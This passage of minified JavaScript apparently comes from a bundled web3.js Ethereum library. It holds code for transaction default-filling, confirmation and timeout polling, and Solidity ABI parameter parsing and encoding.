                throw t === "from" ? new WT(n.from) : new eR(n.to)
        }
        if (t === "from") {
            if (!q(s))
                return Wd(s);
            if (!q(e.defaultAccount))
                return e.defaultAccount
        }
    }
      , qO = (t, e, ...n) => R0(void 0, [t, e, ...n], void 0, function*(s, o, l=s.defaultReturnFormat) {
        if (q(o))
            throw new yR;
        return N_(s, o, s.defaultBlock, l)
    })
      , r_ = (t, e) => {
        const n = BO(t, e);
        if (!q(n))
            return n;
        if (!q(e.defaultTransactionType))
            return ee({
                format: "uint"
            }, e.defaultTransactionType, Ce)
    }
    ;
    function FO(t) {
        return R0(this, void 0, void 0, function*() {
            var e, n;
            let s = ee(Ww, t.transaction, t.web3Context.defaultReturnFormat);
            if (q(s.from) && (s.from = Ap("from", t.web3Context, void 0, t.privateKey)),
            q(s.nonce) && (s.nonce = yield qO(t.web3Context, s.from, Ce)),
            q(s.value) && (s.value = "0x0"),
            q(s.data))
                q(s.input) ? s.input = "0x" : s.input.startsWith("0x") || (s.input = `0x${s.input}`);
            else {
                if (!q(s.input) && s.data !== s.input)
                    throw new b1({
                        data: je(s.data),
                        input: je(s.input)
                    });
                s.data.startsWith("0x") || (s.data = `0x${s.data}`)
            }
            if (q(s.common)) {
                if (t.web3Context.defaultCommon) {
                    const o = t.web3Context.defaultCommon
                      , l = o.customChain.chainId
                      , u = o.customChain.networkId
                      , d = o.customChain.name;
                    s.common = Object.assign(Object.assign({}, o), {
                        customChain: {
                            chainId: l,
                            networkId: u,
                            name: d
                        }
                    })
                }
                q(s.chain) && (s.chain = t.web3Context.defaultChain),
                q(s.hardfork) && (s.hardfork = t.web3Context.defaultHardfork)
            }
            if (q(s.chainId) && q((e = s.common) === null || e === void 0 ? void 0 : e.customChain.chainId) && (s.chainId = yield D_(t.web3Context, Ce)),
            q(s.networkId) && (s.networkId = (n = t.web3Context.defaultNetworkId) !== null && n !== void 0 ? n : yield T0(t.web3Context, Ce)),
            q(s.gasLimit) && !q(s.gas) && (s.gasLimit = s.gas),
            s.type = r_(s, t.web3Context),
            q(s.accessList) && (s.type === "0x1" || s.type === "0x2") && (s.accessList = []),
            t.fillGasPrice && (s = Object.assign(Object.assign({}, s), yield i_(s, t.web3Context, Ce))),
            q(s.gas) && q(s.gasLimit) && t.fillGasLimit) {
                const o = yield j0(t.web3Context, s, "latest", Ce);
                s = Object.assign(Object.assign({}, s), {
                    gas: ee({
                        format: "uint"
                    }, o, Ce)
                })
            }
            return s
        })
    }
    const QO = t => R0(void 0, void 0, void 0, function*() {
        var e;
        return ((e = t.web3Context.transactionBuilder) !== null && e !== void 0 ? e : FO)(Object.assign(Object.assign({}, t), {
            transaction: t.transaction
        }))
    });
    var B0 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function wp(t, e, n) {
        const s = t.transactionPollingInterval
          , [o,l] = fw( () => B0(this, void 0, void 0, function*() {
            let d;
            try {
                d = yield L0(t, ef)
            } catch (h) {
                console.warn("An error happen while trying to get the block number", h);
                return
            }
            const p = d - e;
            if (p >= t.transactionBlockTimeout)
                return new _1({
                    starterBlockNumber: e,
                    numberOfBlocks: p,
                    transactionHash: n
                })
        }), s);
        return [l, {
            clean: () => {
                clearInterval(o)
            }
        }]
    }
    function VO(t, e, n) {
        return B0(this, void 0, void 0, function*() {
            var s;
            let o = !0, l, u;
            function d(h, m) {
                m && console.warn("error happened at subscription. So revert to polling...", m),
                u.clean(),
                o = !1;
                const [y,w] = wp(t, e, n);
                u.clean = w.clean,
                y.catch(E => h(E))
            }
            try {
                l = yield(s = t.subscriptionManager) === null || s === void 0 ? void 0 : s.subscribe("newHeads"),
                u = {
                    clean: () => {
                        var h;
                        l.id && ((h = t.subscriptionManager) === null || h === void 0 || h.removeSubscription(l).then( () => {}
                        ).catch( () => {}
                        ))
                    }
                }
            } catch {
                return wp(t, e, n)
            }
            return [new Promise( (h, m) => {
                try {
                    l.on("data", y => {
                        if (o = !1,
                        !y?.number)
                            return;
                        const w = Number(BigInt(y.number) - BigInt(e));
                        w >= t.transactionBlockTimeout && m(new _1({
                            starterBlockNumber: e,
                            numberOfBlocks: w,
                            transactionHash: n
                        }))
                    }
                    ),
                    l.on("error", y => {
                        d(m, y)
                    }
                    )
                } catch (y) {
                    d(m, y)
                }
                setTimeout( () => {
                    o && d(m)
                }
                , t.blockHeaderTimeout * 1e3)
            }
            ), u]
        })
    }
    function s_(t, e) {
        return B0(this, void 0, void 0, function*() {
            var n, s;
            const {provider: o} = t.requestManager;
            let l;
            const u = yield L0(t, ef);
            return !((s = (n = o).supportsSubscriptions) === null || s === void 0) && s.call(n) && t.enableExperimentalFeatures.useSubscriptionWhenCheckingBlockTimeout ? l = yield VO(t, u, e) : l = wp(t, u, e),
            l
        })
    }
    var YO = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function _p(t, e, n) {
        return YO(this, void 0, void 0, function*() {
            const [s,o] = s0(t.transactionSendTimeout, new bR({
                numberOfSeconds: t.transactionSendTimeout / 1e3,
                transactionHash: n
            }))
              , [l,u] = yield s_(t, n);
            try {
                return yield Promise.race([e(), o, l])
            } finally {
                clearTimeout(s),
                u.clean()
            }
        })
    }
    var VA = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function a_(t, e, n, s) {
        return VA(this, void 0, void 0, function*() {
            var o;
            const l = (o = t.transactionReceiptPollingInterval) !== null && o !== void 0 ? o : t.transactionPollingInterval
              , [u,d] = r0( () => VA(this, void 0, void 0, function*() {
                try {
                    return (s ?? O_)(t, e, n)
                } catch (w) {
                    console.warn("An error happen while trying to get the transaction receipt", w);
                    return
                }
            }), l)
              , [p,h] = s0(t.transactionPollingTimeout, new w1({
                numberOfSeconds: t.transactionPollingTimeout / 1e3,
                transactionHash: e
            }))
              , [m,y] = yield s_(t, e);
            try {
                return yield Promise.race([u, h, m])
            } finally {
                p && clearTimeout(p),
                d && clearInterval(d),
                y.clean()
            }
        })
    }
    var ZO = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const Lu = ({web3Context: t, transactionReceipt: e, transactionPromiEvent: n, customTransactionReceiptSchema: s, returnFormat: o}) => {
        var l;
        let u = 1;
        const d = setInterval( () => {
            ZO(void 0, void 0, void 0, function*() {
                if (u >= t.transactionConfirmationBlocks) {
                    clearInterval(d);
                    return
                }
                const p = yield $w(t.requestManager, kt(BigInt(e.blockNumber) + BigInt(u)), !1);
                p?.hash && (u += 1,
                n.emit("confirmation", {
                    confirmations: ee({
                        format: "uint"
                    }, u, o),
                    receipt: ee(s ?? uo, e, o),
                    latestBlockHash: ee({
                        format: "bytes32"
                    }, p.hash, o)
                }))
            })
        }
        , (l = t.transactionReceiptPollingInterval) !== null && l !== void 0 ? l : t.transactionPollingInterval)
    }
    ;
    var YA = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const KO = ({web3Context: t, transactionReceipt: e, transactionPromiEvent: n, customTransactionReceiptSchema: s, returnFormat: o}) => {
        let l = !0, u;
        setImmediate( () => {
            var d;
            (d = t.subscriptionManager) === null || d === void 0 || d.subscribe("newHeads").then(p => {
                p.on("data", h => YA(void 0, void 0, void 0, function*() {
                    var m;
                    if (l = !1,
                    !h?.number || u === h?.parentHash)
                        return;
                    u = h?.parentHash;
                    const y = BigInt(h.number) - BigInt(e.blockNumber) + BigInt(1);
                    n.emit("confirmation", {
                        confirmations: ee({
                            format: "uint"
                        }, y, o),
                        receipt: ee(s ?? uo, e, o),
                        latestBlockHash: ee({
                            format: "bytes32"
                        }, h.parentHash, o)
                    }),
                    y >= t.transactionConfirmationBlocks && (yield(m = t.subscriptionManager) === null || m === void 0 ? void 0 : m.removeSubscription(p))
                })),
                p.on("error", () => YA(void 0, void 0, void 0, function*() {
                    var h;
                    yield(h = t.subscriptionManager) === null || h === void 0 ? void 0 : h.removeSubscription(p),
                    l = !1,
                    Lu({
                        web3Context: t,
                        transactionReceipt: e,
                        transactionPromiEvent: n,
                        customTransactionReceiptSchema: s,
                        returnFormat: o
                    })
                }))
            }
            ).catch( () => {
                l = !1,
                Lu({
                    web3Context: t,
                    transactionReceipt: e,
                    customTransactionReceiptSchema: s,
                    transactionPromiEvent: n,
                    returnFormat: o
                })
            }
            )
        }
        ),
        setTimeout( () => {
            l && Lu({
                web3Context: t,
                transactionReceipt: e,
                transactionPromiEvent: n,
                returnFormat: o
            })
        }
        , t.blockHeaderTimeout * 1e3)
    }
    ;
    function XO(t, e, n, s, o, l) {
        if (q(n) || q(n.blockHash))
            throw new AR({
                receipt: n,
                blockHash: ee({
                    format: "bytes32"
                }, n?.blockHash, o),
                transactionHash: ee({
                    format: "bytes32"
                }, s, o)
            });
        if (!n.blockNumber)
            throw new wR({
                receipt: n
            });
        e.emit("confirmation", {
            confirmations: ee({
                format: "uint"
            }, 1, o),
            receipt: ee(l ?? uo, n, o),
            latestBlockHash: ee({
                format: "bytes32"
            }, n.blockHash, o)
        });
        const u = t.requestManager.provider;
        u && "supportsSubscriptions"in u && u.supportsSubscriptions() ? KO({
            web3Context: t,
            transactionReceipt: n,
            transactionPromiEvent: e,
            customTransactionReceiptSchema: l,
            returnFormat: o
        }) : Lu({
            web3Context: t,
            transactionReceipt: n,
            transactionPromiEvent: e,
            customTransactionReceiptSchema: l,
            returnFormat: o
        })
    }
    const tf = t => !Ee(t) && typeof t == "object" && !Ee(t.type) && t.type === "error"
      , C0 = t => !Ee(t) && typeof t == "object" && !Ee(t.type) && t.type === "event"
      , nf = t => !Ee(t) && typeof t == "object" && !Ee(t.type) && t.type === "function"
      , JO = t => !Ee(t) && typeof t == "object" && !Ee(t.type) && t.type === "constructor"
      , $O = t => typeof t == "object" && typeof t.components > "u" && typeof t.name > "u"
      , o_ = t => t.includes("[]") ? {
        type: "tuple[]",
        name: t.slice(0, -2)
    } : {
        type: "tuple",
        name: t
    }
      , l_ = t => {
        const e = [];
        for (const n of Object.keys(t)) {
            const s = t[n];
            typeof s == "object" ? e.push(Object.assign(Object.assign({}, o_(n)), {
                components: l_(s)
            })) : e.push({
                name: n,
                type: t[n]
            })
        }
        return e
    }
      , Ep = (t, e) => {
        const n = [];
        return e.forEach(s => {
            if (typeof s.components == "object") {
                if (!s.type.startsWith("tuple"))
                    throw new Ge(`Invalid value given "${s.type}". Error: components found but type is not tuple.`);
                const o = s.type.indexOf("[")
                  , l = o >= 0 ? s.type.substring(o) : ""
                  , u = Ep(t, s.components);
                n.push(`(${u.join(",")})${l}`)
            } else
                n.push(s.type)
        }
        ),
        n
    }
      , $i = t => {
        var e, n, s, o;
        return tf(t) || C0(t) || nf(t) ? !((e = t.name) === null || e === void 0) && e.includes("(") ? t.name : `${(n = t.name) !== null && n !== void 0 ? n : ""}(${Ep(!1, (s = t.inputs) !== null && s !== void 0 ? s : []).join(",")})` : `(${Ep(!1, (o = t.inputs) !== null && o !== void 0 ? o : []).join(",")})`
    }
      , WO = t => {
        if (typeof t != "string" && !tf(t))
            throw new Ge("Invalid parameter value in encodeErrorSignature");
        let e;
        return t && (typeof t == "function" || typeof t == "object") ? e = $i(t) : e = t,
        Tn(e)
    }
      , I0 = t => {
        if (typeof t != "string" && !C0(t))
            throw new Ge("Invalid parameter value in encodeEventSignature");
        let e;
        return t && (typeof t == "function" || typeof t == "object") ? e = $i(t) : e = t,
        Tn(e)
    }
    ;
    function k0(t, e) {
        return t.exec(e)?.groups
    }
    var c_ = /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/
      , u_ = /^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/
      , d_ = /^\(.+?\).*?$/
      , eN = Object.defineProperty
      , tN = (t, e, n) => e in t ? eN(t, e, {
        enumerable: !0,
        configurable: !0,
        writable: !0,
        value: n
    }) : t[e] = n
      , yl = (t, e, n) => (tN(t, typeof e != "symbol" ? e + "" : e, n),
    n)
      , nN = "abitype"
      , iN = "0.7.1"
      , fn = class extends Error {
        constructor(t, e={}) {
            const n = e.cause instanceof fn ? e.cause.details : e.cause?.message ? e.cause.message : e.details
              , s = e.cause instanceof fn && e.cause.docsPath || e.docsPath
              , o = [t || "An error occurred.", "", ...e.metaMessages ? [...e.metaMessages, ""] : [], ...s ? [`Docs: https://abitype.dev${s}`] : [], ...n ? [`Details: ${n}`] : [], `Version: ${nN}@${iN}`].join(`
`);
            super(o),
            yl(this, "details"),
            yl(this, "docsPath"),
            yl(this, "metaMessages"),
            yl(this, "shortMessage"),
            yl(this, "name", "AbiTypeError"),
            e.cause && (this.cause = e.cause),
            this.details = n,
            this.docsPath = s,
            this.metaMessages = e.metaMessages,
            this.shortMessage = t
        }
    }
      , f_ = /^struct (?<name>[a-zA-Z0-9_]+) \{(?<properties>.*?)\}$/;
    function h_(t) {
        return f_.test(t)
    }
    function rN(t) {
        return k0(f_, t)
    }
    var ZA = new Set(["memory", "indexed", "storage", "calldata"])
      , sN = new Set(["calldata", "memory", "storage"]);
    function aN(t, e) {
        return e ? `${e}:${t}` : t
    }
    var Ym = new Map([["address", {
        type: "address"
    }], ["bool", {
        type: "bool"
    }], ["bytes", {
        type: "bytes"
    }], ["bytes32", {
        type: "bytes32"
    }], ["int", {
        type: "int256"
    }], ["int256", {
        type: "int256"
    }], ["string", {
        type: "string"
    }], ["uint", {
        type: "uint256"
    }], ["uint8", {
        type: "uint8"
    }], ["uint16", {
        type: "uint16"
    }], ["uint24", {
        type: "uint24"
    }], ["uint32", {
        type: "uint32"
    }], ["uint64", {
        type: "uint64"
    }], ["uint96", {
        type: "uint96"
    }], ["uint112", {
        type: "uint112"
    }], ["uint160", {
        type: "uint160"
    }], ["uint192", {
        type: "uint192"
    }], ["uint256", {
        type: "uint256"
    }], ["address owner", {
        type: "address",
        name: "owner"
    }], ["address to", {
        type: "address",
        name: "to"
    }], ["bool approved", {
        type: "bool",
        name: "approved"
    }], ["bytes _data", {
        type: "bytes",
        name: "_data"
    }], ["bytes data", {
        type: "bytes",
        name: "data"
    }], ["bytes signature", {
        type: "bytes",
        name: "signature"
    }], ["bytes32 hash", {
        type: "bytes32",
        name: "hash"
    }], ["bytes32 r", {
        type: "bytes32",
        name: "r"
    }], ["bytes32 root", {
        type: "bytes32",
        name: "root"
    }], ["bytes32 s", {
        type: "bytes32",
        name: "s"
    }], ["string name", {
        type: "string",
        name: "name"
    }], ["string symbol", {
        type: "string",
        name: "symbol"
    }], ["string tokenURI", {
        type: "string",
        name: "tokenURI"
    }], ["uint tokenId", {
        type: "uint256",
        name: "tokenId"
    }], ["uint8 v", {
        type: "uint8",
        name: "v"
    }], ["uint256 balance", {
        type: "uint256",
        name: "balance"
    }], ["uint256 tokenId", {
        type: "uint256",
        name: "tokenId"
    }], ["uint256 value", {
        type: "uint256",
        name: "value"
    }], ["event:address indexed from", {
        type: "address",
        name: "from",
        indexed: !0
    }], ["event:address indexed to", {
        type: "address",
        name: "to",
        indexed: !0
    }], ["event:uint indexed tokenId", {
        type: "uint256",
        name: "tokenId",
        indexed: !0
    }], ["event:uint256 indexed tokenId", {
        type: "uint256",
        name: "tokenId",
        indexed: !0
    }]])
      , oN = /^(?<type>[a-zA-Z0-9_]+?)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z0-9_]+))?$/
      , lN = /^\((?<type>.+?)\)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z0-9_]+))?$/
      , cN = /^u?int$/;
    function _d(t, e) {
        const n = aN(t, e?.type);
        if (Ym.has(n))
            return Ym.get(n);
        const s = d_.test(t)
          , o = k0(s ? lN : oN, t);
        if (!o)
            throw new fn("Invalid ABI parameter.",{
                details: t
            });
        if (o.name && dN(o.name))
            throw new fn("Invalid ABI parameter.",{
                details: t,
                metaMessages: [`"${o.name}" is a protected Solidity keyword. More info: https://docs.soliditylang.org/en/latest/cheatsheet.html`]
            });
        const l = o.name ? {
            name: o.name
        } : {}
          , u = o.modifier === "indexed" ? {
            indexed: !0
        } : {}
          , d = e?.structs ?? {};
        let p, h = {};
        if (s) {
            p = "tuple";
            const y = Na(o.type)
              , w = []
              , E = y.length;
            for (let S = 0; S < E; S++)
                w.push(_d(y[S], {
                    structs: d
                }));
            h = {
                components: w
            }
        } else if (o.type in d)
            p = "tuple",
            h = {
                components: d[o.type]
            };
        else if (cN.test(o.type))
            p = `${o.type}256`;
        else if (p = o.type,
        e?.type !== "struct" && !m_(p))
            throw new fn("Unknown type.",{
                metaMessages: [`Type "${p}" is not a valid ABI type.`]
            });
        if (o.modifier) {
            if (!e?.modifiers?.has?.(o.modifier))
                throw new fn("Invalid ABI parameter.",{
                    details: t,
                    metaMessages: [`Modifier "${o.modifier}" not allowed${e?.type ? ` in "${e.type}" type` : ""}.`]
                });
            if (sN.has(o.modifier) && !fN(p, !!o.array))
                throw new fn("Invalid ABI parameter.",{
                    details: t,
                    metaMessages: [`Modifier "${o.modifier}" not allowed${e?.type ? ` in "${e.type}" type` : ""}.`, `Data location can only be specified for array, struct, or mapping types, but "${o.modifier}" was given.`]
                })
        }
        const m = {
            type: `${p}${o.array ?? ""}`,
            ...l,
            ...u,
            ...h
        };
        return Ym.set(n, m),
        m
    }
    function Na(t, e=[], n="", s=0) {
        if (t === "") {
            if (n === "")
                return e;
            if (s !== 0)
                throw new fn("Unbalanced parentheses.",{
                    metaMessages: [`"${n.trim()}" has too many ${s > 0 ? "opening" : "closing"} parentheses.`],
                    details: `Depth "${s}"`
                });
            return [...e, n.trim()]
        }
        const o = t.length;
        for (let l = 0; l < o; l++) {
            const u = t[l]
              , d = t.slice(l + 1);
            switch (u) {
            case ",":
                return s === 0 ? Na(d, [...e, n.trim()]) : Na(d, e, `${n}${u}`, s);
            case "(":
                return Na(d, e, `${n}${u}`, s + 1);
            case ")":
                return Na(d, e, `${n}${u}`, s - 1);
            default:
                return Na(d, e, `${n}${u}`, s)
            }
        }
        return []
    }
    function m_(t) {
        return t === "address" || t === "bool" || t === "function" || t === "string" || c_.test(t) || u_.test(t)
    }
    var uN = /^(?:after|alias|anonymous|apply|auto|byte|calldata|case|catch|constant|copyof|default|defined|error|event|external|false|final|function|immutable|implements|in|indexed|inline|internal|let|mapping|match|memory|mutable|null|of|override|partial|private|promise|public|pure|reference|relocatable|return|returns|sizeof|static|storage|struct|super|supports|switch|this|true|try|typedef|typeof|var|view|virtual)$/;
    function dN(t) {
        return t === "address" || t === "bool" || t === "function" || t === "string" || t === "tuple" || c_.test(t) || u_.test(t) || uN.test(t)
    }
    function fN(t, e) {
        return e || t === "bytes" || t === "string" || t === "tuple"
    }
    function hN(t) {
        const e = {}
          , n = t.length;
        for (let u = 0; u < n; u++) {
            const d = t[u];
            if (!h_(d))
                continue;
            const p = rN(d);
            if (!p)
                throw new fn("Invalid struct signature.",{
                    details: d
                });
            const h = p.properties.split(";")
              , m = []
              , y = h.length;
            for (let w = 0; w < y; w++) {
                const S = h[w].trim();
                if (!S)
                    continue;
                const _ = _d(S, {
                    type: "struct"
                });
                m.push(_)
            }
            if (!m.length)
                throw new fn("Invalid struct signature.",{
                    details: d,
                    metaMessages: ["No properties exist."]
                });
            e[p.name] = m
        }
        const s = {}
          , o = Object.entries(e)
          , l = o.length;
        for (let u = 0; u < l; u++) {
            const [d,p] = o[u];
            s[d] = p_(p, e)
        }
        return s
    }
    var mN = /^(?<type>[a-zA-Z0-9_]+?)(?<array>(?:\[\d*?\])+?)?$/;
    function p_(t, e, n=new Set) {
        const s = []
          , o = t.length;
        for (let l = 0; l < o; l++) {
            const u = t[l];
            if (d_.test(u.type))
                s.push(u);
            else {
                const p = k0(mN, u.type);
                if (!p?.type)
                    throw new fn("Invalid ABI parameter.",{
                        details: JSON.stringify(u, null, 2),
                        metaMessages: ["ABI parameter type is invalid."]
                    });
                const {array: h, type: m} = p;
                if (m in e) {
                    if (n.has(m))
                        throw new fn("Circular reference detected.",{
                            metaMessages: [`Struct "${m}" is a circular reference.`]
                        });
                    s.push({
                        ...u,
                        type: `tuple${h ?? ""}`,
                        components: p_(e[m] ?? [], e, new Set([...n, m]))
                    })
                } else if (m_(m))
                    s.push(u);
                else
                    throw new fn("Unknown type.",{
                        metaMessages: [`Type "${m}" is not a valid ABI type. Perhaps you forgot to include a struct signature?`]
                    })
            }
        }
        return s
    }
    function pN(t) {
        let e;
        if (typeof t == "string")
            e = _d(t, {
                modifiers: ZA
            });
        else {
            const n = hN(t)
              , s = t.length;
            for (let o = 0; o < s; o++) {
                const l = t[o];
                if (!h_(l)) {
                    e = _d(l, {
                        modifiers: ZA,
                        structs: n
                    });
                    break
                }
            }
        }
        if (!e)
            throw new fn("Failed to parse ABI parameter.",{
                details: `parseAbiParameter(${JSON.stringify(t, null, 2)})`,
                docsPath: "/api/human.html#parseabiparameter-1"
            });
        return e
    }
    const wt = 32;
    function xp(t=0) {
        var e;
        if (((e = globalThis.Buffer) === null || e === void 0 ? void 0 : e.alloc) !== void 0) {
            const n = globalThis.Buffer.alloc(t);
            return new Uint8Array(n.buffer,n.byteOffset,n.byteLength)
        }
        return new Uint8Array(t)
    }
    function g_(t) {
        var e, n;
        return Object.assign(Object.assign({}, t), {
            name: (e = t.name) !== null && e !== void 0 ? e : "",
            components: (n = t.components) === null || n === void 0 ? void 0 : n.map(s => g_(s))
        })
    }
    function gN(t) {
        return !Ee(t) && typeof t == "object" && !Ee(t.type) && typeof t.type == "string"
    }
    function y_(t) {
        return t.map(e => {
            var n;
            if (gN(e))
                return e;
            if (typeof e == "string")
                return g_(pN(e.replace(/tuple/, "")));
            if ($O(e)) {
                const s = Object.keys(e)[0]
                  , o = o_(s);
                return o.name = (n = o.name) !== null && n !== void 0 ? n : "",
                Object.assign(Object.assign({}, o), {
                    components: l_(e[s])
                })
            }
            throw new Ge("Invalid abi")
        }
        )
    }
    function O0(t) {
        const e = t.type.lastIndexOf("[")
          , n = t.type.substring(0, e)
          , s = t.type.substring(e);
        let o = -1;
        if (s !== "[]" && (o = Number(s.slice(1, -1)),
        isNaN(o)))
            throw new Ge("Invalid fixed array size",{
                size: s
            });
        return {
            param: {
                type: n,
                name: "",
                components: t.components
            },
            size: o
        }
    }
    function Ed(t) {
        var e, n;
        return t.type === "string" || t.type === "bytes" || t.type.endsWith("[]") ? !0 : t.type === "tuple" ? (n = (e = t.components) === null || e === void 0 ? void 0 : e.some(Ed)) !== null && n !== void 0 ? n : !1 : t.type.endsWith("]") ? Ed(O0(t).param) : !1
    }
    const v_ = 20
      , b_ = wt - v_;
    function yN(t, e) {
        if (typeof e != "string")
            throw new Ge("address type expects string as input type",{
                value: e,
                name: t.name,
                type: t.type
            });
        let n = e.toLowerCase();
        if (n.startsWith("0x") || (n = `0x${n}`),
        !Sn(n))
            throw new Ge("provided input is not valid address",{
                value: e,
                name: t.name,
                type: t.type
            });
        const s = Us(n)
          , o = xp(wt);
        return o.set(s, b_),
        {
            dynamic: !1,
            encoded: o
        }
    }
    function vN(t, e) {
        const n = e.subarray(b_, wt);
        if (n.length !== v_)
            throw new Ge("Invalid decoding input, not enough bytes to decode address",{
                bytes: e
            });
        const s = sr(n);
        return {
            result: _i(s),
            encoded: e.subarray(wt),
            consumed: wt
        }
    }
    const qr = new Map;
    let Ru = BigInt(256);
    for (let t = 8; t <= 256; t += 8)
        qr.set(`uint${t}`, {
            min: BigInt(0),
            max: Ru - BigInt(1)
        }),
        qr.set(`int${t}`, {
            min: -Ru / BigInt(2),
            max: Ru / BigInt(2) - BigInt(1)
        }),
        Ru *= BigInt(256);
    qr.set("int", qr.get("int256"));
    qr.set("uint", qr.get("uint256"));
    const A_ = BigInt(1) << BigInt(256);
    function bN(t, e=wt) {
        let n;
        return t < 0 ? n = (A_ + t).toString(16) : n = t.toString(16),
        n = Ka(n, e * 2),
        Us(n)
    }
    function AN(t, e) {
        const n = sr(t)
          , s = BigInt(n);
        return s <= e ? s : s - A_
    }
    function uc(t, e) {
        let n;
        try {
            n = ps(e)
        } catch {
            throw new Ge("provided input is not number value",{
                type: t.type,
                value: e,
                name: t.name
            })
        }
        const s = qr.get(t.type);
        if (!s)
            throw new Ge("provided abi contains invalid number datatype",{
                type: t.type
            });
        if (n < s.min)
            throw new Ge("provided input is less then minimum for given type",{
                type: t.type,
                value: e,
                name: t.name,
                minimum: s.min.toString()
            });
        if (n > s.max)
            throw new Ge("provided input is greater then maximum for given type",{
                type: t.type,
                value: e,
                name: t.name,
                maximum: s.max.toString()
            });
        return {
            dynamic: !1,
            encoded: bN(n)
        }
    }
    function io(t, e) {
        if (e.length < wt)
            throw new Ge("Not enough bytes left to decode",{
                param: t,
                bytesLeft: e.length
            });
        const n = e.subarray(0, wt)
          , s = qr.get(t.type);
        if (!s)
            throw new Ge("provided abi contains invalid number datatype",{
                type: t.type
            });
        const o = AN(n, s.max);
        if (o < s.min)
            throw new Ge("decoded value is less then minimum for given type",{
                type: t.type,
                value: o,
                name: t.name,
                minimum: s.min.toString()
            });
        if (o > s.max)
            throw new Ge("decoded value is greater then maximum for given type",{
                type: t.type,
                value: o,
                name: t.name,
                maximum: s.max.toString()
            });
        return {
            result: o,
            encoded: e.subarray(wt),
            consumed: wt
        }
    }
    function wN(t, e) {
        let n;
        try {
            n = iw(e)
        } catch (s) {
            if (s instanceof Fp)
                throw new Ge("provided input is not valid boolean value",{
                    type: t.type,
                    value: e,
                    name: t.name
                })
        }
        return uc({
            type: "uint8",
            name: ""
        }, Number(n))
    }
    function _N(t, e) {
        const n = io({
            type: "uint8",
            name: ""
        }, e);
        if (n.result > 1 || n.result < 0)
            throw new Ge("Invalid boolean value encoded",{
                boolBytes: e.subarray(0, wt),
                numberResult: n
            });
        return {
            result: n.result === BigInt(1),
            encoded: n.encoded,
            consumed: wt
        }
    }
    const EN = 32;
    function w_(t, e) {
        if (typeof e == "string" && e.length % 2 !== 0 && (e += "0"),
        !Fr(e))
            throw new Ge("provided input is not valid bytes value",{
                type: t.type,
                value: e,
                name: t.name
            });
        const n = Ai(e)
          , [,s] = t.type.split("bytes");
        if (s) {
            if (Number(s) > EN || Number(s) < 1)
                throw new Ge("invalid bytes type. Static byte type can have between 1 and 32 bytes",{
                    type: t.type
                });
            if (Number(s) < n.length)
                throw new Ge("provided input size is different than type size",{
                    type: t.type,
                    value: e,
                    name: t.name
                });
            const u = xp(wt);
            return u.set(n),
            {
                dynamic: !1,
                encoded: u
            }
        }
        const o = Math.ceil(n.length / wt)
          , l = xp(wt + o * wt);
        return l.set(uc({
            type: "uint32",
            name: ""
        }, n.length).encoded),
        l.set(n, wt),
        {
            dynamic: !0,
            encoded: l
        }
    }
    function __(t, e) {
        const [,n] = t.type.split("bytes");
        let s = Number(n)
          , o = e
          , l = 1
          , u = 0;
        if (!s) {
            const d = io({
                type: "uint32",
                name: ""
            }, o);
            s = Number(d.result),
            u += d.consumed,
            o = d.encoded,
            l = Math.ceil(s / wt)
        }
        if (s > e.length)
            throw new Ge("there is not enough data to decode",{
                type: t.type,
                encoded: e,
                size: s
            });
        return {
            result: je(o.subarray(0, s)),
            encoded: o.subarray(l * wt),
            consumed: u + l * wt
        }
    }
    function xN(t, e) {
        if (typeof e != "string")
            throw new Ge("invalid input, should be string",{
                input: e
            });
        const n = t0(e);
        return w_({
            type: "bytes",
            name: ""
        }, n)
    }
    function SN(t, e) {
        const n = __({
            type: "bytes"
        }, e);
        return {
            result: Fd(n.result),
            encoded: n.encoded,
            consumed: n.consumed
        }
    }
    function E_(t) {
        let e = 0
          , n = 0;
        const s = []
          , o = [];
        for (const l of t)
            l.dynamic ? e += wt : e += l.encoded.length;
        for (const l of t)
